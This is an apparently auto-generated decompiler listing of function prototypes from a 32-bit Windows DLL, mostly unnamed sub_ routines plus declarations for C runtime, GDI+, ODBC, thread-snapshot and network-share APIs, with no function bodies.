int sub_1008AC31();
// int __usercall sub_1008AC44@<eax>(_DWORD *a1@<esi>, int a2);
// int __usercall sub_1008AC82@<eax>(int a1@<ebx>);
int __cdecl sub_1008ACB0(WCHAR *pwcsName, int *a2, _DWORD *a3);
int __cdecl sub_1008AEFA(unsigned __int16 a1);
// unsigned __int16 *__usercall sub_1008AF82@<eax>(unsigned __int16 *a1@<eax>, int a2);
// void __usercall sub_1008AF9D(int a1@<eax>);
// unsigned __int8 *__usercall sub_1008B002@<eax>(int a1@<eax>, unsigned __int8 *a2@<ecx>);
// int __usercall sub_1008B04D@<eax>(int result@<eax>, _DWORD *a2@<ecx>);
unsigned int sub_1008B06A();
// _DWORD *__usercall sub_1008B09A@<eax>(int a1@<eax>, int a2@<ecx>, int a3);
int sub_1008B110();
void sub_1008B14A();
unsigned int sub_1008B167();
int *sub_1008B1B9();
// int __usercall sub_1008B2FE@<eax>(int a1@<ebx>);
// int __usercall sub_1008B393@<eax>(int a1@<eax>);
int sub_1008B3EB();
// _DWORD *__usercall sub_1008B424@<eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3);
// _DWORD *__usercall sub_1008B44C@<eax>(int a1@<edi>, _DWORD *a2@<esi>);
// _DWORD *__usercall sub_1008B49E@<eax>(int a1@<eax>, int a2@<edx>, _DWORD *a3@<esi>);
// int *__usercall sub_1008B50D@<eax>(int a1@<eax>, _DWORD *a2@<ecx>);
// _DWORD *__usercall sub_1008B536@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall sub_1008B568@<eax>(_DWORD *a1@<edi>, int a2);
int *sub_1008B5F9();
void *sub_1008B689();
// char *__userpurge sub_1008B774@<eax>(int a1@<eax>, int a2);
// _BYTE *__userpurge sub_1008B927@<eax>(int a1@<ebx>, unsigned __int8 *a2@<edi>, int a3);
unsigned __int8 *__thiscall sub_1008B9B7(unsigned __int8 *this, int a2);
_DWORD *__thiscall sub_1008BB1B(_DWORD *this, int a2);
char *__cdecl sub_1008BBC2(unsigned __int8 *a1, unsigned __int8 *a2, int a3);
// int __usercall sub_1008BD41@<eax>(int a1@<eax>, int a2@<ecx>);
// char __usercall sub_1008BE77@<al>(unsigned __int8 *a1@<edi>);
// unsigned __int8 *__userpurge sub_1008C03C@<eax>(unsigned __int8 *a1@<eax>, unsigned __int8 *i@<ecx>, int a3);
char *__cdecl sub_1008C188(unsigned __int8 *a1);
int __thiscall sub_1008C448(int this, int a2);
// char __usercall sub_1008C534@<al>(int a1@<eax>, int a2@<ecx>);
// char __userpurge sub_1008C57F@<al>(unsigned __int8 *a1@<eax>, int a2);
int *__thiscall sub_1008C672(unsigned __int8 *this);
char __stdcall sub_1008C718(unsigned __int8 *a1, int a2);
int __stdcall sub_1008C829(_DWORD *a1, _DWORD *a2);
// BOOL __stdcall Thread32First(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
// BOOL __stdcall Thread32Next(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall ConvertStringSecurityDescriptorToSecurityDescriptorW(LPCWSTR StringSecurityDescriptor, DWORD StringSDRevision, PSECURITY_DESCRIPTOR *SecurityDescriptor, PULONG SecurityDescriptorSize);
// BOOL __stdcall ConvertSidToStringSidW(PSID Sid, LPWSTR *StringSid);
FARPROC __stdcall sub_1008CBFE(int *a1, int *Arguments);
// void __stdcall `eh vector destructor iterator'(void *, unsigned int, int, void (__thiscall *)(void *)); idb
// int __cdecl atexit(void (__cdecl *)());
void __cdecl j__free(void *Block);
void __thiscall sub_1008D050(void *this);
_DWORD *__thiscall sub_1008D05B(_DWORD *Block, char a2);
std::exception *__thiscall sub_1008D07D(std::exception *this, struct std::exception *a2);
// void *__cdecl operator new(size_t Size); idb
// __time64_t __cdecl _time64(__time64_t *Time);
void __thiscall sub_1008D13B(struct type_info *this);
struct type_info *__thiscall sub_1008D149(struct type_info *Block, char a2);
// void __stdcall `eh vector constructor iterator'(void *, unsigned int, int, void (__thiscall *)(void *), void (__thiscall *)(void *)); idb
void __cdecl j_j__free(void *Block);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
int __cdecl j___wtol(const wchar_t *String);
void *__cdecl operator new(size_t Size); // idb
// void *__cdecl memset(void *, int Val, size_t Size);
// int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size);
// size_t __cdecl strnlen(const char *String, size_t MaxCount);
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct localeinfo_struct *); idb
// errno_t __cdecl _wcslwr_s(wchar_t *String, size_t SizeInWords);
// size_t __cdecl wcslen(const wchar_t *String);
// errno_t __cdecl _wcsupr_s(wchar_t *String, size_t Size);
// wchar_t *__cdecl wcsrchr(const wchar_t *Str, wchar_t Ch);
// wchar_t *__cdecl wcsstr(const wchar_t *Str, const wchar_t *SubStr);
// wchar_t *__cdecl wcschr(const wchar_t *Str, wchar_t Ch);
// int __cdecl _wcsicmp(const wchar_t *String1, const wchar_t *String2);
// static errno_t __cdecl memcpy_s(void *const Destination, const rsize_t DestinationSize, const void *const Source, const rsize_t SourceSize);
// wint_t __cdecl towlower(wint_t C);
// errno_t __cdecl _wcsnset_s(wchar_t *Destination, size_t SizeInWords, wchar_t Value, size_t MaxCount);
// errno_t __cdecl wcsncpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source, rsize_t MaxCount);
// double __cdecl wcstod(const wchar_t *String, wchar_t **EndPtr);
// unsigned int __cdecl wcstoul(const wchar_t *String, wchar_t **EndPtr, int Radix);
// errno_t __cdecl wcscat_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source);
// int __cdecl wcscmp(const wchar_t *String1, const wchar_t *String2);
// int __cdecl _vsnwprintf_s(wchar_t *const Buffer, const size_t BufferCount, const size_t MaxCount, const wchar_t *const Format, va_list ArgList);
// size_t __cdecl wcsnlen(const wchar_t *Source, size_t MaxCount);
// errno_t __cdecl wcscpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source);
// __time32_t __cdecl time(__time32_t *const Time);
// void __cdecl srand(unsigned int Seed);
// int __cdecl rand();
// void (__cdecl *__cdecl _set_se_translator(void (__cdecl *)(unsigned int, struct _EXCEPTION_POINTERS *)))(unsigned int, struct _EXCEPTION_POINTERS *); idb
// int __cdecl _set_new_mode(int); idb
int __cdecl sub_1009002E(int a1);
// int (__cdecl *__cdecl _set_new_handler(int (__cdecl *)(unsigned int)))(unsigned int); idb
// uintptr_t __cdecl _beginthreadex(void *Security, unsigned int StackSize, _beginthreadex_proc_type StartAddress, void *ArgList, unsigned int InitFlag, unsigned int *ThrdAddr);
// char *__cdecl strcpy(char *Destination, const char *Source);
// wint_t __cdecl towupper(wint_t C);
// void __cdecl free(void *Block);
// void *__cdecl malloc(size_t Size);
void __thiscall sub_10090594(void *this);
// int __cdecl strtol(const char *String, char **EndPtr, int Radix);
// int __cdecl abs(int Number);
// _DWORD __cdecl _encode_pointer(_DWORD); weak
// int _encoded_null(void); weak
// _DWORD __cdecl _decode_pointer(_DWORD); weak
int sub_10090C05();
int __cdecl sub_1009135E(_DWORD *a1);
int __cdecl sub_10091395(_DWORD *a1);
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const struct std::exception *); idb
void __thiscall sub_1009166F(void *this);
void *__thiscall sub_10091692(void *Block, char a2);
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// void __cdecl type_info::_Type_info_dtor(struct type_info *); idb
// int __cdecl strcmp(const char *Str1, const char *Str2);
int __cdecl sub_10091CD0(int a1);
void *sub_100923C7();
void __cdecl sub_100923EB(); // idb
int __cdecl sub_10093490(int a1);
// void __cdecl __noreturn _invoke_watson(const wchar_t *Expression, const wchar_t *FunctionName, const wchar_t *FileName, unsigned int LineNo, uintptr_t Reserved);
// int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int *__cdecl _errno();
// void __cdecl __noreturn __report_gsfailure();
// void *__cdecl realloc(void *Block, size_t Size);
int sub_100962D5();
int __cdecl sub_10096492(int a1);
int __cdecl sub_1009649C(int a1);
// int _get_sse2_info(void); weak
int sub_1009671B();
int __cdecl sub_10096805(int a1, int a2, int a3);
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
void sub_100977B9();
int __cdecl sub_10097A5D(unsigned __int16 *a1, _DWORD *a2);
int __cdecl sub_10097F9F(unsigned __int16 *a1, _DWORD *a2);
void **sub_1009A021();
// void *__cdecl memcpy_0(void *, const void *Src, size_t Size);
int __cdecl j__atol(const char *String);
int __cdecl sub_1009AA1E(_DWORD *a1);
int __cdecl sub_1009AA52(_DWORD *a1);
int __cdecl sub_1009AA86(_DWORD *a1);
int *sub_1009AABA();
int *sub_1009AAC0();
int *sub_1009AAC6();
void **sub_1009AACC();
int __cdecl sub_1009B67B(_DWORD *a1, int a2, struct localeinfo_struct *a3);
int __cdecl sub_1009B721(_DWORD *a1, int a2, struct localeinfo_struct *a3);
// _DWORD __cdecl flsall(_DWORD); weak
int sub_1009BFCC();
// _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// char *__cdecl strchr(const char *Str, int Val);
bool __cdecl __uncaught_exception(); // idb
// int __stdcall GetModuleBaseNameW(_DWORD, _DWORD, _DWORD, _DWORD); weak
// HRESULT __stdcall LoadIFilter(PCWSTR pwcsPath, IUnknown *pUnkOuter, void **ppIUnk);
// int __stdcall GdipCloneImage(_DWORD, _DWORD); weak
// int __stdcall GdipFree(_DWORD); weak
// int __stdcall GdipAlloc(_DWORD); weak
// int __stdcall GdipGetAllPropertyItems(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipLoadImageFromFile(_DWORD, _DWORD); weak
// int __stdcall GdipDisposeImage(_DWORD); weak
// int __stdcall GdipGetPropertySize(_DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipGetImageEncoders(_DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipCreateBitmapFromScan0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipDeleteGraphics(_DWORD); weak
// int __stdcall GdipCreateBitmapFromStream(_DWORD, _DWORD); weak
// int __stdcall GdipSaveImageToStream(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipGetImageGraphicsContext(_DWORD, _DWORD); weak
// int __stdcall GdipGetImageEncodersSize(_DWORD, _DWORD); weak
// int __stdcall GdipDrawImageRectI(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipGetImageHeight(_DWORD, _DWORD); weak
// int __stdcall GdipGetImageWidth(_DWORD, _DWORD); weak
// int __stdcall GdipCreateBitmapFromFile(_DWORD, _DWORD); weak
// int __stdcall GdiplusShutdown(_DWORD); weak
// int __stdcall GdiplusStartup(_DWORD, _DWORD, _DWORD); weak
// SQLRETURN __stdcall SQLFetch(SQLHSTMT StatementHandle);
// SQLRETURN __stdcall SQLColumnsW(SQLHSTMT hstmt, SQLWCHAR *szCatalogName, SQLSMALLINT cchCatalogName, SQLWCHAR *szSchemaName, SQLSMALLINT cchSchemaName, SQLWCHAR *szTableName, SQLSMALLINT cchTableName, SQLWCHAR *szColumnName, SQLSMALLINT cchColumnName);
// SQLRETURN __stdcall SQLDriverConnectW(SQLHDBC hdbc, SQLHWND hwnd, SQLWCHAR *szConnStrIn, SQLSMALLINT cchConnStrIn, SQLWCHAR *szConnStrOut, SQLSMALLINT cchConnStrOutMax, SQLSMALLINT *pcchConnStrOut, SQLUSMALLINT fDriverCompletion);
// SQLRETURN __stdcall SQLSetConnectAttr(SQLHDBC ConnectionHandle, SQLINTEGER Attribute, SQLPOINTER Value, SQLINTEGER StringLength);
// SQLRETURN __stdcall SQLBindCol(SQLHSTMT StatementHandle, SQLUSMALLINT ColumnNumber, SQLSMALLINT TargetType, SQLPOINTER TargetValue, SQLINTEGER BufferLength, SQLINTEGER *StrLen_or_Ind);
// SQLRETURN __stdcall SQLDisconnect(SQLHDBC ConnectionHandle);
// SQLRETURN __stdcall SQLExecDirectW(SQLHSTMT hstmt, SQLWCHAR *szSqlStr, SQLINTEGER TextLength);
// SQLRETURN __stdcall SQLSetEnvAttr(SQLHENV EnvironmentHandle, SQLINTEGER Attribute, SQLPOINTER Value, SQLINTEGER StringLength);
// SQLRETURN __stdcall SQLAllocHandle(SQLSMALLINT HandleType, SQLHANDLE InputHandle, SQLHANDLE *OutputHandle);
// SQLRETURN __stdcall SQLFreeHandle(SQLSMALLINT HandleType, SQLHANDLE Handle);
// SQLRETURN __stdcall SQLCloseCursor(SQLHSTMT StatementHandle);
// SQLRETURN __stdcall SQLGetDiagRecA(SQLSMALLINT fHandleType, SQLHANDLE handle, SQLSMALLINT iRecord, SQLCHAR *szSqlState, SQLINTEGER *pfNativeError, SQLCHAR *szErrorMsg, SQLSMALLINT cbErrorMsgMax, SQLSMALLINT *pcbErrorMsg);
void __thiscall sub_1009E999(void *this);
_DWORD *__thiscall sub_1009E9A4(_DWORD *Block, char a2);
std::exception *__thiscall sub_1009F53A(std::exception *this, struct std::exception *a2);
// char *__cdecl strncpy(char *Destination, const char *Source, size_t Count);
// errno_t __cdecl _localtime64_s(struct tm *Tm, const __time64_t *Time);
// int _swprintf(wchar_t *const Buffer, const wchar_t *const Format, ...);
void sub_1009FFBF();
void sub_1009FFCE();
// DWORD __stdcall WNetEnumResourceW(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// DWORD __stdcall WNetCloseEnum(HANDLE hEnum);
// DWORD __stdcall WNetOpenEnumW(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEW lpNetResource, LPHANDLE lphEnum);
void __cdecl sub_100A05A1(int a1);
int __stdcall sub_100A0607(int a1);
int sub_100C504B();
int sub_100C506D();
int sub_100C5088();
int sub_100C50E4();
int sub_100C5106();
int sub_100C5128();
int sub_100C514A();
int sub_100C516C();
int sub_100C518E();
int sub_100C51B0();
int sub_100C51D2();
int sub_100C51F4();
int sub_100C5216();
int sub_100C5238();
int sub_100C525A();
int sub_100C527C();
int sub_100C529E();
int sub_100C52C0();
int sub_100C52E2();
int sub_100C5304();
int sub_100C5326();
int sub_100C5348();
int sub_100C536A();
int sub_100C538C();
int sub_100C53AE();
int sub_100C53D0();
int sub_100C53F2();
int sub_100C5414();
int sub_100C5436();
int sub_100C5458();
int sub_100C547A();
int sub_100C549C();
int sub_100C54BE();
int sub_100C54E0();
int sub_100C5502();
int sub_100C5524();
int sub_100C5546();
int sub_100C5568();
int sub_100C558A();
int sub_100C55AC();
int sub_100C55CE();
int sub_100C55F0();
int sub_100C5612();
int sub_100C5634();
int sub_100C5656();
int sub_100C5678();
int sub_100C569A();
int sub_100C56BC();
int sub_100C56DE();
int sub_100C5700();
int sub_100C5722();
int sub_100C5744();
int sub_100C5766();
int sub_100C5788();
int sub_100C57AA();
int sub_100C57CC();
int sub_100C57EE();
int sub_100C5810();
int sub_100C5832();
int sub_100C5854();
int sub_100C5876();
int sub_100C5898();
int sub_100C58BA();
int sub_100C58DC();
int sub_100C58FE();
int sub_100C5920();
int sub_100C5942();
int sub_100C5964();
int sub_100C5986();
int sub_100C59A8();
int sub_100C59CA();
int sub_100C59EC();
int sub_100C5A0E();
int sub_100C5A30();
int sub_100C5A52();
int sub_100C5A74();
int sub_100C5A96();
int sub_100C5AB8();
int sub_100C5ADA();
int sub_100C5AFC();
int sub_100C5B1E();
int sub_100C5B40();
int sub_100C5B62();
int sub_100C5B84();
int sub_100C5BA6();
int sub_100C5BC8();
int sub_100C5BEA();
int sub_100C5C0C();
int sub_100C5C2E();
int sub_100C5C50();
int sub_100C5C72();
int sub_100C5C94();
int sub_100C5CB6();
int sub_100C5CD8();
int sub_100C5CFA();
int sub_100C5D1C();
int sub_100C5D3E();
int sub_100C5D60();
int sub_100C5D82();
int sub_100C5DA4();
int sub_100C5DC6();
int sub_100C5DE8();
int sub_100C5E0A();
int sub_100C5E2C();
int sub_100C5E4E();
int sub_100C5E70();
int sub_100C5E92();
int sub_100C5EA8();
int sub_100C5EC2();
int sub_100C5ED8();
int sub_100C5EEE();
int sub_100C5F04();
int sub_100C5F1C();
int sub_100C5F78();
int sub_100C5F9A();
int sub_100C5FBC();
int sub_100C5FFA();
int sub_100C6014();
int sub_100C602E();
int sub_100C6048();
int sub_100C6062();
int sub_100C607C();
int sub_100C6092();
int sub_100C60A8();
int sub_100C60F7();
int sub_100C610D();
int sub_100C6128();
int sub_100C613E();
int sub_100C6158();
int sub_100C6174();
int sub_100C6195();
int sub_100C61D4();
int sub_100C6230();
int sub_100C6252();
int sub_100C6288();
int sub_100C62A9();
int sub_100C62CB();
int sub_100C62ED();
int sub_100C630F();
int sub_100C6331();
int sub_100C6353();
int sub_100C6375();
int sub_100C6397();
int sub_100C63B9();
int sub_100C63CF();
int sub_100C63F0();
int sub_100C6412();
int sub_100C6451();
int sub_100C6489();
int sub_100C649A();
int sub_100C64BC();
int sub_100C64D7();
int sub_100C64F2();
int sub_100C6508();
int sub_100C6514();
int sub_100C6536();
int sub_100C6558();
int sub_100C657A();
int sub_100C659C();
int sub_100C65BE();
int sub_100C65E0();
int sub_100C6602();
int sub_100C6624();
int sub_100C6646();
int sub_100C665C();
int sub_100C6672();
int sub_100C667E();
char *sub_100C66A0();
char *sub_100C66B1();
int sub_100C66C2();
int sub_100C66E4();
int sub_100C66FF();
int sub_100C6721();
int sub_100C6743();
int sub_100C6765();
int sub_100C6787();
int sub_100C67A9();
int sub_100C67CB();
int sub_100C67ED();
int sub_100C680F();
int sub_100C6831();
int sub_100C6853();
int sub_100C6875();
int sub_100C6897();
int sub_100C68AD();
int sub_100C68B9();
int sub_100C68DB();
int sub_100C68FD();
int sub_100C691F();
int sub_100C6941();
int sub_100C6963();
int sub_100C6985();
int sub_100C69A7();
int sub_100C69C9();
int sub_100C69EB();
int sub_100C6A0D();
int sub_100C6A2F();
int sub_100C6A51();
int sub_100C6A6C();
int sub_100C6A8E();
int sub_100C6AB0();
int sub_100C6AD2();
int sub_100C6AF4();
int sub_100C6B16();
int sub_100C6B6A();
int sub_100C6BBE();
int sub_100C6BD4();
int sub_100C6BE0();
int sub_100C6C34();
int sub_100C6C88();
int sub_100C6CDC();
int sub_100C6D30();
int sub_100C6D84();
int sub_100C6DD8();
int sub_100C6E2C();
int sub_100C6E80();
int sub_100C6ED4();
int sub_100C6F28();
int sub_100C6F7C();
int sub_100C6FD0();
int sub_100C7024();
int sub_100C7082();
int sub_100C70D6();
int sub_100C712A();
int sub_100C717E();
int sub_100C71D2();
int sub_100C7226();
int sub_100C727A();
int sub_100C7295();
int sub_100C72E9();
int sub_100C730B();
int sub_100C732D();
int sub_100C734F();
int sub_100C73A3();
int sub_100C73F7();
int sub_100C744B();
int sub_100C749F();
int sub_100C74BA();
int sub_100C750E();
int sub_100C7562();
int sub_100C7584();
int sub_100C75A6();
int sub_100C75C8();
int sub_100C75EA();
int sub_100C760C();
int sub_100C762E();
int sub_100C7650();
int sub_100C7672();
int sub_100C7694();
int sub_100C76B6();
int sub_100C76D8();
int sub_100C76FA();
int sub_100C771C();
int sub_100C7732();
int sub_100C7748();
int sub_100C775E();
int sub_100C7774();
int sub_100C77C8();
int sub_100C77EA();
int sub_100C780C();
int sub_100C7860();
int sub_100C7882();
int sub_100C78A4();
int sub_100C78C6();
int sub_100C78E8();
int sub_100C790A();
int sub_100C792C();
int sub_100C794E();
int sub_100C7970();
int sub_100C79BE();
int sub_100C79D9();
int sub_100C79F4();
int sub_100C7A48();
int sub_100C7A9C();
int sub_100C7AB5();
int sub_100C7ACE();
int sub_100C7B22();
int sub_100C7B44();
int sub_100C7B66();
size_t sub_100C7B88();
int sub_100C7BF4();
int sub_100C7C0A();
int sub_100C7C2A();
int sub_100C7C7E();
wchar_t *sub_100C7CD2();
int sub_100C7CE3();
int sub_100C7D37();
int sub_100C7D8B();
int sub_100C7DAD();
int sub_100C7DBB();
int sub_100C7E0F();
int sub_100C7E63();
int sub_100C7E74();
wchar_t *sub_100C7E85();
wchar_t *sub_100C7E96();
int sub_100C7EA7();
int sub_100C7EC9();
int sub_100C7EEB();
int sub_100C7F0D();
int sub_100C7F2F();
_DWORD *sub_100C7F83();
_DWORD *sub_100C7F95();
int sub_100C7FA5();
int sub_100C800E();
int sub_100C8077();
int sub_100C80E0();
int sub_100C8149();
int sub_100C81B2();
int sub_100C821B();
int sub_100C8284();
int sub_100C82E6();
int sub_100C8348();
int sub_100C83B1();
int sub_100C841A();
int sub_100C847C();
int sub_100C84E5();
int sub_100C854E();
int sub_100C85B0();
int sub_100C8612();
int sub_100C8674();
int sub_100C86D6();
int sub_100C8738();
int sub_100C879A();
int sub_100C87EE();
int sub_100C8810();
int sub_100C8832();
int sub_100C8854();
int sub_100C88A8();
int sub_100C88CA();
int sub_100F2200();
int sub_100F2254();
int sub_100F22BD();
int sub_100F2326();
int sub_100F238F();
int sub_100F23F8();
int sub_100F2461();
int sub_100F24CA();
int sub_100F24EC();
int sub_100F2533();
int sub_100F259C();
int sub_100F2605();
int sub_100F266E();
int sub_100F26D7();
int sub_100F2740();
int sub_100F27A9();
int sub_100F2812();
int sub_100F287B();
int sub_100F28E4();
int sub_100F294D();
int sub_100F29B6();
int sub_100F29D8();
int sub_100F29FA();
int sub_100F2A1C();
int sub_100F2A3E();
int sub_100F2A60();
int sub_100F2A82();
int sub_100F2AA4();
int sub_100F2AC6();
int sub_100F2AE8();
int sub_100F2B0A();
int sub_100F2B5E();
int sub_100F2BB2();
int sub_100F2C06();
int sub_100F2C3A();
int sub_100F2C6D();
int sub_100F2C8F();
int sub_100F2CE3();
int sub_100F2D05();
int sub_100F2D27();
int sub_100F2D49();
int sub_100F2D9D();
int sub_100F2DB7();
int sub_100F2DD1();
int sub_100F2DE7();
int sub_100F2DF3();
int sub_100F2E15();
int sub_100F2E26();
int sub_100F2E48();
int sub_100F2E6A();
int sub_100F2E8C();
int sub_100F2EAE();
int sub_100F2EC9();
int sub_100F2EDF();
int *sub_100F2EEB();
void __cdecl sub_100F2F06(); // idb
void __cdecl sub_100F2F10(); // idb
void __cdecl sub_100F2F1A(); // idb
void __cdecl sub_100F2F24(); // idb
void __cdecl sub_100F2F2E(); // idb
void __cdecl sub_100F2F38(); // idb
void __cdecl sub_100F2F42(); // idb
void __cdecl sub_100F2F4C(); // idb
void __cdecl sub_100F2F56(); // idb
void __cdecl sub_100F2F60(); // idb
void __cdecl sub_100F2F6A(); // idb
void __cdecl sub_100F2F74(); // idb
void __cdecl sub_100F2F7E(); // idb
void __cdecl sub_100F2F88(); // idb
void __cdecl sub_100F2F92(); // idb
void __cdecl sub_100F2F9C(); // idb
void __cdecl sub_100F2FA6(); // idb
void __cdecl sub_100F2FB0(); // idb
void __cdecl sub_100F2FBA(); // idb
void __cdecl sub_100F2FC4(); // idb
void __cdecl sub_100F2FCE(); // idb
void __cdecl sub_100F2FD8(); // idb
void __cdecl sub_100F2FE2(); // idb
void __cdecl sub_100F2FEC(); // idb
void __cdecl sub_100F2FF6(); // idb
void __cdecl sub_100F3000(); // idb
void __cdecl sub_100F300A(); // idb
void __cdecl sub_100F3014(); // idb
void __cdecl sub_100F301E(); // idb
void __cdecl sub_100F3028(); // idb
void __cdecl sub_100F3032(); // idb
void __cdecl sub_100F303C(); // idb
void __cdecl sub_100F3046(); // idb
void __cdecl sub_100F3050(); // idb
void __cdecl sub_100F305A(); // idb
void __cdecl sub_100F3064(); // idb
void __cdecl sub_100F306E(); // idb
void __cdecl sub_100F3078(); // idb
void __cdecl sub_100F3082(); // idb
void __cdecl sub_100F308C(); // idb
void __cdecl sub_100F3096(); // idb
void __cdecl sub_100F30A0(); // idb
void __cdecl sub_100F30AA(); // idb
void __cdecl sub_100F30B4(); // idb
void __cdecl sub_100F30BE(); // idb
void __cdecl sub_100F30C8(); // idb
void __cdecl sub_100F30D2(); // idb
void __cdecl sub_100F30DC(); // idb
void __cdecl sub_100F30E6(); // idb
void __cdecl sub_100F30F0(); // idb
void __cdecl sub_100F30FA(); // idb
void __cdecl sub_100F3104(); // idb
void __cdecl sub_100F310E(); // idb
void __cdecl sub_100F3118(); // idb
void __cdecl sub_100F3122(); // idb
void __cdecl sub_100F312C(); // idb
void __cdecl sub_100F3136(); // idb
void __cdecl sub_100F3140(); // idb
void __cdecl sub_100F314A(); // idb
void __cdecl sub_100F3154(); // idb
void __cdecl sub_100F315E(); // idb
void __cdecl sub_100F3168(); // idb
void __cdecl sub_100F3172(); // idb
void __cdecl sub_100F317C(); // idb
void __cdecl sub_100F3186(); // idb
void __cdecl sub_100F3190(); // idb
void __cdecl sub_100F319A(); // idb
void __cdecl sub_100F31A4(); // idb
void __cdecl sub_100F31AE(); // idb
void __cdecl sub_100F31B8(); // idb
void __cdecl sub_100F31C2(); // idb
void __cdecl sub_100F31CC(); // idb
void __cdecl sub_100F31D6(); // idb
void __cdecl sub_100F31E0(); // idb
void __cdecl sub_100F31EA(); // idb
void __cdecl sub_100F31F4(); // idb
void __cdecl sub_100F31FE(); // idb
void __cdecl sub_100F3208(); // idb
void __cdecl sub_100F3212(); // idb
void __cdecl sub_100F321C(); // idb
void __cdecl sub_100F3226(); // idb
void __cdecl sub_100F3230(); // idb
void __cdecl sub_100F323A(); // idb
void __cdecl sub_100F3244(); // idb
void __cdecl sub_100F324E(); // idb
void __cdecl sub_100F3258(); // idb
void __cdecl sub_100F3262(); // idb
void __cdecl sub_100F326C(); // idb
void __cdecl sub_100F3276(); // idb
void __cdecl sub_100F3280(); // idb
void __cdecl sub_100F328A(); // idb
void __cdecl sub_100F3294(); // idb
void __cdecl sub_100F329E(); // idb
void __cdecl sub_100F32A8(); // idb
void __cdecl sub_100F32B2(); // idb
void __cdecl sub_100F32BC(); // idb
void __cdecl sub_100F32C6(); // idb
void __cdecl sub_100F32D0(); // idb
void __cdecl sub_100F32DA(); // idb
void __cdecl sub_100F32E4(); // idb
void __cdecl sub_100F32EE(); // idb
void __cdecl sub_100F32F8(); // idb
void __cdecl sub_100F3302(); // idb
void __cdecl sub_100F330C(); // idb
void __cdecl sub_100F3316(); // idb
void __cdecl sub_100F3320(); // idb
void __cdecl sub_100F332A(); // idb
void __cdecl sub_100F3335(); // idb
void __cdecl sub_100F3340(); // idb
void __cdecl sub_100F334A(); // idb
void __cdecl sub_100F3354(); // idb
void __cdecl sub_100F335E(); // idb
void __cdecl sub_100F3368(); // idb
void __cdecl sub_100F3372(); // idb
void __cdecl sub_100F337C(); // idb
void __cdecl sub_100F3386(); // idb
void __cdecl sub_100F3390(); // idb
void __cdecl sub_100F339A(); // idb
void __cdecl sub_100F33A4(); // idb
void __cdecl sub_100F33AE(); // idb
void __cdecl sub_100F33B8(); // idb
void __cdecl sub_100F33C2(); // idb
void __cdecl sub_100F33CC(); // idb
void __cdecl sub_100F33D6(); // idb
void __cdecl sub_100F33E0(); // idb
void __cdecl sub_100F33EA(); // idb
void __cdecl sub_100F33EF(); // idb
void __cdecl sub_100F33F9(); // idb
void __cdecl sub_100F3403(); // idb
void __cdecl sub_100F340D(); // idb
void __cdecl sub_100F3417(); // idb
void __cdecl sub_100F3421(); // idb
void __cdecl sub_100F342B(); // idb
void __cdecl sub_100F3435(); // idb
void __cdecl sub_100F343F(); // idb
void __cdecl sub_100F3449(); // idb
void __cdecl sub_100F3453(); // idb
void __cdecl sub_100F345D(); // idb
void __cdecl sub_100F3467(); // idb
void __cdecl sub_100F3471(); // idb
void __cdecl sub_100F347B(); // idb
void __cdecl sub_100F3485(); // idb
void __cdecl sub_100F348F(); // idb
void __cdecl sub_100F3499(); // idb
void __cdecl sub_100F34A3(); // idb
void __cdecl sub_100F34AD(); // idb
void __cdecl sub_100F34B7(); // idb
void __cdecl sub_100F34C1(); // idb
void __cdecl sub_100F34CB(); // idb
void __cdecl sub_100F34D5(); // idb
void __cdecl sub_100F34DF(); // idb
void __cdecl sub_100F34E9(); // idb
void __cdecl sub_100F34F3(); // idb
void __cdecl sub_100F34FD(); // idb
void __cdecl sub_100F3507(); // idb
void __cdecl sub_100F3511(); // idb
void __cdecl sub_100F351B(); // idb
void __cdecl sub_100F3525(); // idb
void __cdecl sub_100F352F(); // idb
void __cdecl sub_100F3539(); // idb
void __cdecl sub_100F3543(); // idb
void __cdecl sub_100F354D(); // idb
void __cdecl sub_100F3557(); // idb
void __cdecl sub_100F3561(); // idb
void __cdecl sub_100F356B(); // idb
void __cdecl sub_100F3575(); // idb
void __cdecl sub_100F357F(); // idb
void __cdecl sub_100F3589(); // idb
void __cdecl sub_100F3593(); // idb
void __cdecl sub_100F359D(); // idb
void __cdecl sub_100F35A7(); // idb
void __cdecl sub_100F35B1(); // idb
void __cdecl sub_100F35BB(); // idb
void __cdecl sub_100F35C5(); // idb
void __cdecl sub_100F35CF(); // idb
void __cdecl sub_100F35D9(); // idb
void __cdecl sub_100F35E3(); // idb
void __cdecl sub_100F35ED(); // idb
void __cdecl sub_100F35F7(); // idb
void __cdecl sub_100F3601(); // idb
void __cdecl sub_100F360B(); // idb
void __cdecl sub_100F3615(); // idb
void __cdecl sub_100F361F(); // idb
void __cdecl sub_100F3629(); // idb
void __cdecl sub_100F3633(); // idb
void __cdecl sub_100F363D(); // idb
void __cdecl sub_100F3647(); // idb
void __cdecl sub_100F3651(); // idb
void __cdecl sub_100F365B(); // idb
void __cdecl sub_100F3665(); // idb
void __cdecl sub_100F366F(); // idb
